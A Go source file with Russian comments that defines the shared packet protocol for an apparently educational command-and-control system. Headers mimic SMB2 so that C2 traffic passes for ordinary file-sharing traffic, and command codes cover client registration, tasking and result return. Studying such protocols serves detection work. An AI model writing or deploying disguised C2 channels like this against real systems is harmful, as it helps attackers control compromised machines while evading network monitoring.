// Package shared содержит общие для всех компонентов системы (терминал,
// C2-сервер, клиент) определения: формат псевдо-SMB пакета, функции
// шифрования/дешифрования и константы протокола.
package shared

import (
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"net"
)

// Константы протокола обфускации и коды команд C2.
const (
	// SMB2ProtocolID — маркер, с которого начинается заголовок пакета.
	// Имитирует реальный маркер SMB2-заголовка (\xfeSMB).
	SMB2ProtocolID = "\xfeSMB"
	// SMB2HeaderSize — фиксированный размер заголовка пакета в байтах.
	SMB2HeaderSize = 64

	// Коды команд, передаваемых между C2 и клиентом.
	CmdRegister    = 0x0000 // Клиент -> C2: регистрация
	CmdRegisterAck = 0x0001 // C2 -> Клиент: подтверждение регистрации
	CmdGetTask     = 0x0002 // Клиент -> C2: запрос задачи
	CmdTaskData    = 0x0003 // C2 -> Клиент: данные задачи (или пусто)
	CmdSendResult  = 0x0004 // Клиент -> C2: отправка результата
	CmdResultAck   = 0x0005 // C2 -> Клиент: подтверждение получения результата

	// MaxPayloadSize — максимально допустимый размер полезной нагрузки
	// (16 МБ). Используется для защиты от некорректных или вредоносных
	// пакетов с завышенной длиной.
	MaxPayloadSize = 16 * 1024 * 1024
)

// Packet описывает структуру пакета, передаваемого между C2 и клиентом.
// Заголовок пакета имитирует SMB2-заголовок фиксированного размера (64 байта),
// а поле Payload содержит зашифрованные данные.
type Packet struct {
	Command   uint16 // Код команды (CmdRegister, CmdGetTask и т.д.)
	Status    uint32 // Статус выполнения (зарезервировано)
	SessionID uint64 // Идентификатор сессии
	MessageID uint64 // Идентификатор сообщения
	TreeID    uint32 // Идентификатор ресурса (в учебных целях используется как признак наличия задачи)
	Payload   []byte // Полезная нагрузка (зашифрованная)
}

// Serialize собирает пакет в байтовый срез в формате, повторяющем
// структуру SMB2-заголовка. Поля записываются в порядке LittleEndian.
// После 64-байтового заголовка добавляется полезная нагрузка.
// Возвращает готовый к отправке байтовый срез.
func (p *Packet) Serialize() []byte {
	buf := new(bytes.Buffer)

	buf.WriteString(SMB2ProtocolID)                                // 0..3   ProtocolId
	binary.Write(buf, binary.LittleEndian, uint16(SMB2HeaderSize)) // 4..5   StructureSize
	binary.Write(buf, binary.LittleEndian, uint16(0))              // 6..7   CreditCharge
	binary.Write(buf, binary.LittleEndian, p.Status)               // 8..11  Status
	binary.Write(buf, binary.LittleEndian, p.Command)              // 12..13 Command
	binary.Write(buf, binary.LittleEndian, uint16(0))              // 14..15 CreditRequest
	binary.Write(buf, binary.LittleEndian, uint32(0))              // 16..19 Flags
	binary.Write(buf, binary.LittleEndian, uint32(0))              // 20..23 NextCommand
	binary.Write(buf, binary.LittleEndian, p.MessageID)            // 24..31 MessageId
	binary.Write(buf, binary.LittleEndian, uint32(len(p.Payload))) // 32..35 PayloadLength
	binary.Write(buf, binary.LittleEndian, p.TreeID)               // 36..39 TreeId
	binary.Write(buf, binary.LittleEndian, p.SessionID)            // 40..47 SessionId
	buf.Write(make([]byte, 16))                                    // 48..63 Signature (пустые)

	buf.Write(p.Payload) // полезная нагрузка

	return buf.Bytes()
}

// Deserialize разбирает байтовый срез в структуру Packet.
// Проверяет минимальную длину и корректность маркера SMB2ProtocolID,
// а также контролирует размер payload относительно MaxPayloadSize.
// Возвращает указатель на Packet или ошибку при некорректных данных.
func Deserialize(data []byte) (*Packet, error) {
	if len(data) < SMB2HeaderSize {
		return nil, errors.New("packet too short")
	}
	if string(data[0:4]) != SMB2ProtocolID {
		return nil, errors.New("invalid protocol id")
	}
	p := &Packet{}
	p.Status = binary.LittleEndian.Uint32(data[8:12])
	p.Command = binary.LittleEndian.Uint16(data[12:14])
	p.MessageID = binary.LittleEndian.Uint64(data[24:32])
	payloadLen := binary.LittleEndian.Uint32(data[32:36])
	p.TreeID = binary.LittleEndian.Uint32(data[36:40])
	p.SessionID = binary.LittleEndian.Uint64(data[40:48])

	if payloadLen > MaxPayloadSize {
		return nil, errors.New("payload too large")
	}
	if uint32(len(data)-SMB2HeaderSize) < payloadLen {
		return nil, errors.New("incomplete payload")
	}
	p.Payload = data[SMB2HeaderSize : SMB2HeaderSize+payloadLen]
	return p, nil
}

// ReadPacket полностью читает один пакет из TCP-соединения.
// Сначала считывает 64 байта заголовка, извлекает из него длину payload,
// затем дочитывает ровно столько байт полезной нагрузки через io.ReadFull.
// Это гарантирует корректную работу при передаче больших пакетов,
// когда данные не приходят одним сегментом.
// Возвращает указатель на Packet или ошибку.
func ReadPacket(conn net.Conn) (*Packet, error) {
	header := make([]byte, SMB2HeaderSize)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}
	payloadLen := binary.LittleEndian.Uint32(header[32:36])
	if payloadLen > MaxPayloadSize {
		return nil, errors.New("payload too large")
	}
	full := make([]byte, SMB2HeaderSize+payloadLen)
	copy(full, header)
	if payloadLen > 0 {
		if _, err := io.ReadFull(conn, full[SMB2HeaderSize:]); err != nil {
			return nil, err
		}
	}
	return Deserialize(full)
}
